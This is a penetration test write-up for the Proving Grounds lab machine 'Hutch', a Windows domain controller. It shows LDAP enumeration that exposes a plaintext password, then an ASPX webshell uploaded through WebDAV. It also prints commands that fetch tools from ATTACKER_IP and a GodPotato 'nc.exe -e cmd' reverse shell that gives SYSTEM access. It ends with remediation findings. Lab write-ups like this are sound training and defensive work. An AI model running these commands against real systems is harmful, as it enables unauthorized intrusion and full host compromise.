# PGP Nickel - OSCP-Style Penetration Test Report

**Author:** randalltr

**Date:** 2026-3-2

---

## 0. Lesson Learned

WebDAV exploitation does not require a special directory. It can be enabled at root. Check the potentially risky methods and always test upload directly to `/`.

---

## 1. Executive Summary

The target host Hutch was identified as a Windows Server 2019 Domain Controller hosting Active Directory services, IIS with WebDAV enabled, SMB, LDAP, Kerberos, and WinRM.

Initial access was achieved through LDAP enumeration, which revealed plaintext credentials stored within a user description field. These credentials were used to authenticate against multiple services.

Further enumeration revealed that IIS WebDAV allowed authenticated file uploads via HTTP PUT. This misconfiguration enabled arbitrary ASPX file upload, leading to remote code execution as `iis apppool\defaultapppool`.

Privilege escalation was achieved by leveraging the `SeImpersonatePrivilege` using GodPotato, resulting in SYSTEM-level access.

Administrator credentials were then recovered, and full domain compromise was demonstrated.

---

## 2. Scope

- **Target:** 192.168.199.122
- **Environment:** Proving Grounds Practice Hutch
- **Testing Window:** 2026-2-27
- **Objective:** Full system compromise

---

## 3. Methodology

Testing followed a standard OSCP methodology:

- Information Gathering
- Enumeration
- Initial Access
- Post-Exploitation
- Privilege Escalation
- Proof of Compromise

---

## 4. Information Gathering

Full TCP Scan:

```
nmap -p- -sCV 192.168.199.122 -T4 -oA hutch_tcp
```

Identified open ports:

- 53 DNS
- 80 HTTP (IIS 10.0 WebDAV)
- 88 Kerberos
- 135/139/445 SMB
- 389 LDAP
- 464 Kpasswd
- 593 RPC
- 636 LDAPS
- 3268/3269 Global Catalog
- 5985 WinRM
- 9389 .NET Message Framing
- 49666-49692 RPC

---

## 5. Enumeration

Anonymous SMB login successful with limited access:

```
smbclient -L //192.168.199.122 -N
```

Users were enumerated with LDAP after retrieving naming contexts:

```
ldapsearch -x -H ldap://192.168.199.122 -s base namingcontexts

ldapsearch -x -H ldap://192.168.199.122 -b "DC=hutch,DC=offsec" "(objectClass=person)"
```

User Freddy McSorely (`fmcsorley`) had a plainext password stored in the description field:

```
Password set to CrabSharkJellyfish192 at user's request.
```

Resulting in recovered credentials:

```
fmcsorley : CrabSharkJellyfish192
```

Successful authentication confirmed with crackmapexec:

```
crackmapexec smb 192.168.199.122 -u fmcsorley -p CrabSharkJellyfish192
```

Continuing enumeration LDAP simple bind was successful:

```
ldapdomaindump ldap://192.168.199.122 -u 'HUTCH/fmcsorley' -p 'CrabSharkJellyfish192' --authtype SIMPLE
```

No SPNs found for Kerberoastable accounts:

```
GetUserSPNs.py HUTCH.OFFSEC/fmcsorley:CrabSharkJellyfish192 -dc-ip 192.168.199.122 -request
```

No vulnerable AS-REP roastable accounts:

```
GetNPUsers.py HUTCH.OFFSEC/ -no-pass -dc-ip 192.168.199.122 -usersfile userslist.txt
```

Authenticated SMB shares were accessed by no credential material discoved:

```
smbclient //192.168.199.122 -U fmcsorley%CrabSharkJellyfish192
cd SYSVOL
RECURSE ON
PROMPT OFF
mget *
```

---

## 6. Initial Access

Initial Nmap scan revealed risky HTTP PUT method enabled. Attempted upload without credentials was unauthorized:

```
curl -i -T test.txt http://192.168.199.122/test.txt
```

Upload was successful using recovered credentials:

```
curl -i -u 'fmcsorley:CrabSharkJellyfish192' -T test.txt http://192.168.199.122/test.txt
```

Resulting in a 201 Created response code.

Cadaver was used with recovered credentials to upload an aspx webshell:

```
cadaver http://192.168.199.122 

put /usr/share/webshells/aspx/cmdasp.aspx
```

This resulted in a webshell as user `iis apppool\defaultapppool`.

Hoaxshell was used to make interaction easier:

```
git clone https://github.com/t3l3machus/hoaxshell
python3 -m venv hoaxenv
source hoaxenv/bin/activate
pip install -r hoaxshell/requirements.txt
python3 hoaxshell/hoaxshell.py -s ATTACKER_IP
```

Pasting the generated reverse shell payload in the `cmdasp.aspx` webshell resulted in a low level interactive shell as user `iis apppool\defaultapppool` on `hutchdc`.

---

## 7. Post-Exploitation

System enumeration revealed Windows Server 2019 Standard:

```
systeminfo
```

And user privileges revealed vulnerable `SeImpersonatePrivilege` enabled:

```
whoami /priv
```

---

## 8. Privilege Escalation

To exploit the vulnerable `SeImpersonatePrivilege`, GodPotato and nc.exe were uploaded to the target machine:

```
cd C:\Windows\Temp

iwr -Uri http://ATTACKER_IP/GodPotato-NET4.exe -Outfile godpotato.exe

iwr -Uri http://ATTACKER_IP/nc.exe -Outfile nc.exe
```

A listener was started on the attacker machine:

```
nc -lnvp 1337
```

GodPotato was executed on the target machine:

```
.\godpotato.exe -cmd "C:\Windows\Temp\nc.exe -e cmd ATTACKER_IP 1337"
```

SYSTEM shell obtained.

---

## 9. Proof of Compromise

**User Flag**: *REDACTED*

```
type C:\Users\fmcsorley\Desktop\local.txt
```

**Root Flag**: *REDACTED*

```
type C:\Users\Administrator\Desktop\proof.txt
```

This confirms full system compromise.

---

## 10. Findings & Recommendations

### **Finding:** Plaintext Password Stored in LDAP Attribute

**Severity:** Critical

**Description:**
A domain user password was stored in plaintext within an Active Directory attribute (such as the description field), making it accessible to authenticated users.

**Impact:**
Attackers could retrieve the exposed credential and use it to authenticate as the affected user, potentially leading to privilege escalation or lateral movement.

**Recommendation:**
Prohibit storage of credentials in Active Directory attributes, implement auditing for sensitive attribute exposure, and perform credential rotation for affected accounts.

### **Finding:** WebDAV Authenticated File Upload Enabled

**Severity:** Critical

**Description:**
The WebDAV service allowed authenticated users to upload arbitrary files to the IIS web root using the HTTP PUT method.

**Impact:**
Attackers could upload malicious files and achieve remote code execution on the server.

**Recommendation:**
Disable WebDAV if not required, restrict the HTTP PUT method, and enforce secure upload directory controls with execution restrictions.

### **Finding:** SeImpersonatePrivilege Assigned to Service Account

**Severity:** Critical

**Description:**
A service account possessed the SeImpersonatePrivilege privilege, allowing token impersonation attacks.

**Impact:**
Attackers could exploit token impersonation techniques to escalate privileges to SYSTEM.

**Recommendation:**
Harden service account privileges, remove unnecessary impersonation rights, apply Microsoft privilege hardening guidance, and monitor for abnormal token impersonation activity.

---

## 11. Appendix

cmdasp.aspx Webshell -
[https://gitlab.com/kalilinux/packages/webshells](https://gitlab.com/kalilinux/packages/webshells)

HoaxShell GitHub -
[https://github.com/t3l3machus/hoaxshell](https://github.com/t3l3machus/hoaxshell)

GodPotato Net4 GitHub - 
[https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)

Nc.exe GitHub -
[https://github.com/int0x33/nc.exe/](https://github.com/int0x33/nc.exe/)